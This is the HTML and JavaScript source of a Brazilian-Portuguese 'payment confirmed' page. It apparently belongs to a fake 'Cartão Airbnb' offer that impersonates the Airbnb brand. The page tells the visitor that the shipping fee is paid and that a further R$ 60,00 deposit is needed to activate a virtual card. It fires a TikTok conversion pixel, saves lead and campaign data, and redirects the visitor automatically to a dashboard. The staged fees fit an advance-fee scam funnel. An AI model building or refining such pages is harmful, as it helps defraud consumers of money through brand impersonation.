<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pagamento Confirmado! — Cartão Airbnb</title>
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--gray:#6A6A6A;--gray-light:#DDDDDD;--bg:#F7F7F7;--white:#FFFFFF;--green:#34C759;--font:'Sora',-apple-system,sans-serif}
        body{font-family:var(--font);background:var(--black);color:#fff;-webkit-font-smoothing:antialiased;min-height:100vh;overflow-x:hidden}
        .page{max-width:520px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;text-align:center;position:relative;overflow:hidden}

        .glow{position:absolute;width:260px;height:260px;border-radius:50%;filter:blur(80px);opacity:.15;pointer-events:none}
        .g1{background:var(--green);top:-60px;right:-60px;animation:g1 8s ease infinite}
        .g2{background:var(--red);bottom:60px;left:-60px;animation:g2 10s ease infinite}
        @keyframes g1{0%,100%{transform:translate(0,0)}50%{transform:translate(-25px,18px)}}
        @keyframes g2{0%,100%{transform:translate(0,0)}50%{transform:translate(18px,-25px)}}

        canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:100}

        .check-circle{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,var(--green),#2DB84D);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:32px;animation:pop .6s cubic-bezier(.175,.885,.32,1.275);box-shadow:0 8px 30px rgba(52,199,89,.4);position:relative;z-index:10}
        @keyframes pop{0%{transform:scale(0);opacity:0}50%{transform:scale(1.12)}100%{transform:scale(1);opacity:1}}

        .page h1{font-size:1.8rem;font-weight:800;letter-spacing:-.03em;margin-bottom:8px;position:relative;z-index:10;animation:fu .6s ease .3s both}
        .page .sub{font-size:.875rem;color:rgba(255,255,255,.5);margin-bottom:32px;line-height:1.7;position:relative;z-index:10;animation:fu .6s ease .5s both}
        @keyframes fu{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}

        .order-box{width:100%;max-width:360px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:18px;padding:20px;margin:0 auto 28px;position:relative;z-index:10;animation:fu .6s ease .7s both}
        .ob-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:.83rem}
        .ob-row:last-child{border:none}
        .ob-label{color:rgba(255,255,255,.45)}
        .ob-val{font-weight:700}
        .ob-val.green{color:var(--green)}

        .cta-sec{width:100%;max-width:360px;position:relative;z-index:10;animation:fu .6s ease .9s both}
        .cta-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:17px;border:none;border-radius:14px;font-size:.98rem;font-weight:700;cursor:pointer;font-family:var(--font);background:linear-gradient(135deg,var(--red),var(--red-dark));color:#fff;text-decoration:none;transition:.25s;box-shadow:0 6px 22px rgba(255,56,92,.3);margin-bottom:10px}
        .cta-btn:hover{filter:brightness(1.06);transform:translateY(-2px)}
        .cta-btn:active{transform:scale(.98)}
        .cta-note{font-size:.7rem;color:rgba(255,255,255,.3);line-height:1.6}

        .redirect-bar{width:100%;max-width:360px;margin:20px auto 0;position:relative;z-index:10;animation:fu .5s ease 1.1s both}
        .rb-label{font-size:.7rem;color:rgba(255,255,255,.3);margin-bottom:6px}
        .rb-track{height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden}
        .rb-fill{height:100%;background:var(--green);border-radius:2px;width:0%;transition:width .1s linear}
    </style>
</head>
<body>
<canvas id="confetti"></canvas>
<div class="page">
    <div class="glow g1"></div>
    <div class="glow g2"></div>

    <div class="check-circle"><i class="fas fa-check"></i></div>
    <h1>Pagamento confirmado!</h1>
    <p class="sub">Frete pago com sucesso! Agora ative seu<br>cartão virtual com o depósito inicial.</p>

    <div class="order-box">
        <div class="ob-row"><span class="ob-label">Cartão</span><span class="ob-val">Airbnb Gold · Visa</span></div>
        <div class="ob-row"><span class="ob-label">Frete</span><span class="ob-val green"><i class="fas fa-check-circle" style="font-size:10px;margin-right:3px"></i>Pago</span></div>
        <div class="ob-row"><span class="ob-label">Cartão virtual</span><span class="ob-val" style="color:var(--red)">Aguardando ativação</span></div>
        <div class="ob-row"><span class="ob-label">Próximo passo</span><span class="ob-val">Depositar saldo inicial</span></div>
    </div>

    <div class="cta-sec">
        <button class="cta-btn" onclick="irParaDashboard()">
            <i class="fas fa-credit-card"></i> Ativar meu cartão agora
        </button>
        <div class="cta-note">Depósito mínimo de R$ 60,00 para ativar o cartão virtual</div>
    </div>

    <div class="redirect-bar">
        <div class="rb-label">Redirecionando automaticamente...</div>
        <div class="rb-track"><div class="rb-fill" id="rbFill"></div></div>
    </div>
</div>

<script>
    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
    const LeadData={_k:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._k,JSON.stringify(u));return u}};
    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}

    LeadData.update({frete_pago: true, page: 'confirmado'});

    // ===== PIXEL: CompletePayment (página de confirmação carregada) =====
    window.addEventListener('load', function() {
        setTimeout(function() {
            try {
                if(window.ttq) {
                    ttq.track('CompletePayment', {
                        content_type: 'product',
                        content_id: 'cartao-airbnb',
                        content_name: 'Cartão Airbnb',
                        currency: 'BRL',
                        value: 197.00
                    });
                }
            } catch(pe){ console.warn('Pixel error:', pe); }
        }, 1000);
    });
    // ===================================================================

    function irParaDashboard(){
        window.location.href = buildUrl('dashboard.html');
    }

    // Auto-redirect barra de progresso
    let pct = 0;
    const fill = document.getElementById('rbFill');
    const interval = setInterval(() => {
        pct += 100/40; // 4 segundos
        fill.style.width = Math.min(pct, 100) + '%';
        if(pct >= 100){ clearInterval(interval); irParaDashboard(); }
    }, 100);

    // Confetti
    const canvas = document.getElementById('confetti');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const cols = ['#FF385C','#E00B41','#34C759','#fff','#FFD93D','#32BCAD'];
    const pieces = Array.from({length:120},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height-canvas.height,w:Math.random()*9+4,h:Math.random()*4+2,r:Math.random()*Math.PI*2,dr:Math.random()*.1-.05,sp:Math.random()*3+2,c:cols[Math.floor(Math.random()*cols.length)],a:1}));
    let frame=0;
    function draw(){
        ctx.clearRect(0,0,canvas.width,canvas.height);
        pieces.forEach(p=>{
            ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.r);ctx.globalAlpha=p.a;
            ctx.fillStyle=p.c;ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();
            p.y+=p.sp;p.r+=p.dr;p.x+=Math.sin(p.r)*.5;
            if(p.y>canvas.height){p.y=-10;p.x=Math.random()*canvas.width;}
            if(frame>200)p.a=Math.max(0,p.a-.005);
        });
        frame++;
        if(frame<350)requestAnimationFrame(draw);else ctx.clearRect(0,0,canvas.width,canvas.height);
    }
    setTimeout(draw,200);
</script>
</body>
</html>
